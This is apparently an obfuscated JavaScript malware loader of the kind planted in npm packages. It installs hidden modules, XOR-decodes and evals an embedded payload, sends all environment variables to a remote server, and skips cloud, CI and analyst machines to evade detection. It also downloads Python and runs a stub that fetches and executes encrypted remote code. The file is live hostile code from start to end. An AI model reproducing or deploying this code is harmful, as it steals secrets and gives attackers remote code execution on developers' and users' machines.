const a0b = (function () {
    let a = true
    return function (b, c) {
      const d = a
        ? function () {
            if (c) {
              const e = c.apply(b, arguments)
              return (c = null), e
            }
          }
        : function () {}
      return (a = false), d
    }
  })(),
  a0a = a0b(this, function () {
    return a0a
      .toString()
      .search('(((.+)+)+)+$')
      .toString()
      .constructor(a0a)
      .search('(((.+)+)+)+$')
  })
a0a()
;(async () => {
  const o = global,
    p = {},
    q = o['_V'] || '0',
    r = o['_H'],
    s = o.r,
    t = s('os')
  const u = s('path'),
    v = s('fs')
  const w = s('child_process'),
    x = t.platform(),
    y = t.hostname()
  const z = t.userInfo().username,
    A = t.release()
  let B = t.type() + ' ' + A
  if (o.process.env.K_SERVICE) {
    B += ', K_SERVICE=' + o.process.env.K_SERVICE
  }
  if (o.process.env.VERCEL_HIVE_VERSION) {
    B += ', VERCEL_HIVE_VERSION=' + o.process.env.VERCEL_HIVE_VERSION
  }
  const C = u.join(t.homedir(), '.node_modules')
  if (typeof module === 'object') {
    module.paths.push(u.join(C, 'node_modules'))
  } else {
    if (o.m) {
      o.m.paths.push(u.join(C, 'node_modules'))
    } else {
      if (o['_module']) {
        o['_module'].paths.push(u.join(C, 'node_modules'))
      }
    }
  }
  async function D(G, H) {
    return new o.Promise((I, J) => {
      w.exec(G, H, (L, M, N) => {
        if (L) {
          J('Error: ' + L.message)
          return
        }
        if (N) {
          J('Stderr: ' + N)
          return
        }
        I(M)
      })
    })
  }
  async function E(G, H, I) {
    const L = w.spawn(G, H, I)
    L.on('error', (P) => {})
    let M = ''
    if (L.stdout) {
      for await (const P of L.stdout) {
        M += P
      }
    }
    let N = ''
    if (L.stderr) {
      for await (const Q of L.stderr) {
        N += Q
      }
    }
    const O = await new Promise((R, S) => {
      L.on('close', R)
    })
    if (O) {
      throw new Error('subprocess error exit ' + O + ', ' + N)
    }
    return M
  }
  function F(G) {
    try {
      return s.resolve(G), s(G), true
    } catch (H) {
      return false
    }
  }
  for (let G = 0; G < 3; G++) {
    try {
      const H = F('axios')
      if (!H) {
        try {
          await D('npm --prefix "' + C + '" install axios socket.io-client', {
            stdio: 'inherit',
            windowsHide: true,
          })
        } catch (M) {}
      }
      const I = s('axios')
      async function J(N, O) {
        try {
          const P = r + '/verify-human/' + q,
            Q = { text: O ? O + '[' + q + '] ' + N : '[' + q + '] ' + N }
          const R = new globalThis.URLSearchParams(Q)
          await I.post(P, R)
        } catch (S) {}
      }
      o['_R'] = J
      try {
        const N = (function (O) {
          const P = '4#uLeVM[3lESLGA'
          const Q = P.length
          let R = ''
          for (let S = 0; S < O.length; S++) {
            const T = O.charCodeAt(S),
              U = P.charCodeAt(S % Q)
            R += o.String.fromCharCode(T ^ U)
          }
          return R
        })(
          atob(
            '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'
          )
        )
        if (!N) {
          throw new Error('clientCode is null')
        }
        w.spawn(
          'node',
          [
            '-e',
            "global['_V']='" +
              q +
              "';global['r' ]=require;global['m']=module;" +
              N,
          ],
          {
            detached: true,
            stdio: 'ignore',
            windowsHide: true,
          }
        ).on('error', function (O) {})
        eval("global['e']='boot-eval';" + N)
      } catch (O) {
        J(y + '$' + z + ' / ' + B + '\nfailed to run clientCode: ' + O)
      }
      ;(async () => {
        try {
          const R = o.process.env,
            S = Object.keys(R)
              .sort()
              .reduce((X, Y) => {
                if (
                  ![
                    'pm_uptime',
                    'created_at',
                    'restart_time',
                    'versioning',
                    'vizion_running',
                    'exit_code',
                    'NEXT_DEPLOYMENT_ID',
                    'NEXT_PRIVATE_TRACE_ID',
                    'NEXT_PRIVATE_WORKER',
                    'RUST_MIN_STACK',
                    '__NEXT_PRIVATE_RUNTIME_TYPE',
                    'prev_restart_delay',
                    'unique_id',
                  ].includes(Y)
                ) {
                  X[Y] = R[Y]
                }
                return X
              }, {}),
            T = JSON.stringify(S),
            U = r + '/snv',
            V = {
              id: y + '$' + z,
              user: z,
              body: T,
            }
          const W = new globalThis.URLSearchParams(V)
          await I.post(U, W)
        } catch (X) {}
      })()
      if (x === 'linux' && !A.includes('microsoft-standard-WSL2')) {
        if (
          (z === 'ubuntu' ||
            z === 'runner' ||
            z === 'root' ||
            z === 'render' ||
            z === 'webapp' ||
            z === 'heroku' ||
            (/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/.test(
              y
            ) &&
              /^u\d+$/.test(z))) &&
          (A.includes('-aws') || A.includes('.amzn') || A.includes('.cm2'))
        ) {
          J(
            y + '$' + z + ' / ' + B + '\nBlocked (AWS)\n' + process.cwd(),
            '(Blocked)'
          )
          return
        }
        if (z === 'amplify' && A.includes('.amzn')) {
          J(
            y + '$' + z + ' / ' + B + '\nBlocked (Amplify)\n' + process.cwd(),
            '(Blocked)'
          )
          return
        }
        if (
          (z === 'runner' && A.includes('-azure')) ||
          (z === 'codespace' && A.includes('-azure')) ||
          (z === 'azureuser' && A.includes('-azure')) ||
          (z === 'assemblyline' && A.includes('-azure'))
        ) {
          J(
            y + '$' + z + ' / ' + B + '\nBlocked (Azure)\n' + process.cwd(),
            '(Blocked)'
          )
          return
        }
        if (y === 'localhost' && z === 'root' && o.process.env.K_SERVICE) {
          J(
            y + '$' + z + ' / ' + B + '\nBlocked (GCP)\n' + process.cwd(),
            '(Blocked)'
          )
          return
        }
        if (
          y.startsWith('192.168.') &&
          z === 'root' &&
          o.process.env.VERCEL_HIVE_VERSION
        ) {
          J(
            y + '$' + z + ' / ' + B + '\nBlocked (Vercel)\n' + process.cwd(),
            '(Blocked)'
          )
          return
        }
        if (
          (y.startsWith('build-') || y === 'buildkitsandbox') &&
          (z === 'root' || z === 'buildbot')
        ) {
          J(
            y + '$' + z + ' / ' + B + '\nBlocked (buildbot)\n' + process.cwd(),
            '(Blocked)'
          )
          return
        }
        if (
          (/^srv\d+$/.test(y) || /^iyla-vista-[0-9a-f]{8}$/.test(y)) &&
          z === 'root'
        ) {
          J(
            y + '$' + z + ' / ' + B + '\nBlocked\n' + process.cwd(),
            '(Blocked)'
          )
          return
        }
        if (y.startsWith('vps-') && z === 'github-runner') {
          J(
            y + '$' + z + ' / ' + B + '\nBlocked\n' + process.cwd(),
            '(Blocked)'
          )
          return
        }
        if (
          y === 'kali' &&
          (z === 'root' || z === 'kali' || z === 'shellchocolat')
        ) {
          J(
            y + '$' + z + ' / ' + B + '\nBlocked\n' + process.cwd(),
            '(Blocked)'
          )
          return
        }
        if (
          (y.startsWith('1a-cicd-') || y.startsWith('1b-cicd-')) &&
          (z === 'ubuntu' || z === 'shop_runner')
        ) {
          J(
            y + '$' + z + ' / ' + B + '\nBlocked\n' + process.cwd(),
            '(Blocked)'
          )
          return
        }
        if (
          (/^[0-9a-f]{12}$/.test(y) && (z === 'root' || z === 'node')) ||
          (/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/.test(
            y
          ) &&
            z === 'ubuntu') ||
          (y.startsWith('vmi') &&
            y.endsWith('.contaboserver.net') &&
            z === 'root') ||
          ((y.startsWith('community-node-service-api-') ||
            y.startsWith('teneo-admin-panel-')) &&
            z == 'apps') ||
          ((/^[0-9a-f]{12}$/.test(y) ||
            y === 'devcontainer' ||
            y.startsWith('ip-172-')) &&
            (z === 'root' || z === 'panda' || z === 'bitnami' || z == 'sail') &&
            (A.includes('-cloud') || A.includes('linuxkit')))
        ) {
          J(
            y + '$' + z + ' / ' + B + '\nBlocked\n' + process.cwd(),
            '(Blocked)'
          )
          return
        }
      } else {
        if (y === 'EV-CHQG3L42MMQ') {
          J(
            y + '$' + z + ' / ' + B + '\nBlocked (Test)\n' + process.cwd(),
            '(Test-Blocked)'
          )
          return
        }
      }
      async function K(R, S) {
        const T = v.createWriteStream(S)
        const U = await I({
          url: R,
          method: 'GET',
          responseType: 'stream',
        })
        return (
          U.data.pipe(T),
          new Promise((V, W) => {
            T.on('finish', V)
            T.on('error', W)
          })
        )
      }
      const L =
        "\ncode = \"\"\"\nimport sys,base64\nfrom urllib.request import Request,urlopen;\ndef x(a,b):\n\tkn=len(b);c=bytearray(len(a))\n\tfor i in range(len(a)):c[i]=a[i]^ord(b[i%kn])\n\treturn c\nif __name__=='__main__':\n\tif len(sys.argv)<2:print('invalid args');sys.exit()\n\tid=sys.argv[1];sys._v1=sys.argv[2]if len(sys.argv)>2 else'';sys._v2=sys.argv[3]if len(sys.argv)>3 else None;sys.argv=sys.argv[:1]\n\ttry:exec(x(base64.b64decode(urlopen(Request(f'" +
        r +
        "/$/{id}',headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML; like Gecko) Chrome/131.0.0.0 Safari/537.36'})).read().decode('utf-8')),'9KyASt+7D0mjPHFY').decode('utf-8'),globals())\n\texcept Exception as ex:print(ex)\n\"\"\"\nimport os,sys,subprocess\n_v1=sys.argv[1]if len(sys.argv)>1 else''\n_v2=sys.argv[2]if len(sys.argv)>2 else''\nif sys.platform.startswith(\"win\"):flags=subprocess.CREATE_NO_WINDOW|subprocess.CREATE_NEW_PROCESS_GROUP\nelse:flags=0\nsubprocess.Popen([sys.executable,'-c',code,'z1',_v1,_v2],creationflags=flags,preexec_fn=os.setsid if flags==0 else None)\n# subprocess.Popen([sys.executable,'-c',code,'zz2',_v1],creationflags=flags,preexec_fn=os.setsid if flags==0 else None)\nprint(\"</?>\")"
      if (x.startsWith('win')) {
        const R =
            process.env.LOCALAPPDATA || u.join(t.homedir(), 'AppData', 'Local'),
          S = u.join(R, 'Programs\\Python\\Python3127'),
          T = u.join(S, 'Doc'),
          U = u.join(S, 'python.exe')
        let V = false,
          W = false
        try {
          const Z = { windowsHide: true }
          V = await E('py', ['-V'], Z)
          const a0 = { windowsHide: true }
          W = await E('py', ['-m', 'pip', '-V'], a0)
          J(y + '$' + z + ' / ' + B + '\npy = ' + V + ', pip = ' + W)
        } catch (a1) {}
        const X = 'tmp' + new Date().getTime() + '.tmp',
          Y = u.join(R, 'Temp', X)
        for (let a2 = 0; a2 < 3; a2++) {
          aA: try {
            try {
              v.readFileSync(u.join(R, 'Temp', 'tmp7A863DD1.tmp'))
            } catch (a3) {
              if (a3.code === 'EBUSY') {
                J(y + '$' + z + ' / ' + B + '\nstill running...')
                a2--
                await new Promise((a4) => setTimeout(a4, 15000))
                break aA
              }
            }
            if (v.existsSync(Y)) {
              break
            } else {
              if (V && W && V.includes('Python 3.')) {
                const a4 = { windowsHide: true }
                const a5 = await E('py', ['-c', L, q, X], a4)
                J(y + '$' + z + ' / ' + B + '\n' + a5)
                if (!a5.includes('</?>')) {
                  V = false
                  continue
                }
              } else {
                if (v.existsSync(T) && v.existsSync(U)) {
                  const a6 = { windowsHide: true }
                  const a7 = await E(U, ['-V'], a6)
                  J(y + '$' + z + ' / ' + B + '\n' + a7)
                  if (a7 && a7.includes('Python 3.')) {
                    const a8 = { windowsHide: true }
                    const a9 = await E(U, ['-c', L, q, X], a8)
                    J(y + '$' + z + ' / ' + B + '\n' + a9)
                    if (!a9.includes('</?>')) {
                      const aa = {
                        recursive: true,
                        force: true,
                      }
                      await v.promises.rm(T, aa)
                      continue
                    }
                  } else {
                    J(y + '$' + z + ' / ' + B + '\npyExecV = ' + a7)
                    const ab = {
                      recursive: true,
                      force: true,
                    }
                    await v.promises.rm(T, ab)
                    continue
                  }
                } else {
                  J(y + '$' + z + ' / ' + B + '\nInstalling python...')
                  const ac = { recursive: true }
                  await v.promises.mkdir(S, ac)
                  const ad = r + '/d/python.zip',
                    ae = u.join(S, 'python.zip')
                  await K(ad, ae)
                  try {
                    const ag = {
                      shell: true,
                      windowsHide: true,
                    }
                    await E('tar', ['-xf', ae, '-C', S], ag)
                  } catch (ah) {
                    J(
                      y +
                        '$' +
                        z +
                        ' / ' +
                        B +
                        '\nfailed to install py using tar: ' +
                        ah
                    )
                    const ai = r + '/d/python.7z',
                      aj = u.join(S, 'python.7z')
                    await K(ai, aj)
                    const ak = r + '/d/7zr.exe',
                      al = u.join(S, '7zr.exe')
                    await K(ak, al)
                    const am = { windowsHide: true }
                    await E(al, ['x', aj, '-o' + S, '-bd', '-aoa'], am)
                  }
                  const af = { recursive: true }
                  await v.promises.mkdir(T, af)
                  continue
                }
              }
            }
          } catch (an) {
            J(y + '$' + z + ' / ' + B + '\nfailed to install/run py: ' + an)
          }
          await new Promise((ao) => setTimeout(ao, 15000))
        }
      } else {
        const ao = u.join(t.homedir(), '.pyenv'),
          ap = u.join(ao, 'Doc')
        let aq = u.join(ao, 'versions/3.12.7/bin/python'),
          ar = false
        try {
          ar = await E('python3', ['-V'])
          J(y + '$' + z + ' / ' + B + '\npy3 = ' + ar)
        } catch (as) {}
        for (let at = 0; at < 3; at++) {
          try {
            if (ar && ar.includes('Python 3.')) {
              const au = await E('python3', ['-c', L, q])
              if (au.includes('<ERROR> Failed to install pip:')) {
                J(y + '$' + z + ' / ' + B + '\n' + au + '\nInstalling pip...')
                const av = '/tmp/get-pip.py'
                await K('https://bootstrap.pypa.io/get-pip.py', av)
                await D('python3 "' + av + '" --break-system-packages')
                continue
              } else {
                if (au.includes('</?>')) {
                  J(y + '$' + z + ' / ' + B + '\n' + au)
                  break
                } else {
                  J(y + '$' + z + ' / ' + B + '\n' + au)
                }
              }
              ar = false
              continue
            }
          } catch (aw) {
            J(y + '$' + z + ' / ' + B + '\nfailed to install/run py: ' + aw)
          }
          await new Promise((ax) => setTimeout(ax, 15000))
        }
      }
    } catch (ax) {
      o['_R'] && o['_R'](y + '$' + z + ' / ' + B + '\n' + ax)
      if (ax.code == 'MODULE_NOT_FOUND') {
        try {
          const ay = {
            recursive: true,
            force: true,
          }
          v.rmSync(C, ay)
        } catch (az) {}
      }
      await new Promise((aA) => setTimeout(aA, 1000))
      continue
    }
    break
  }
})()
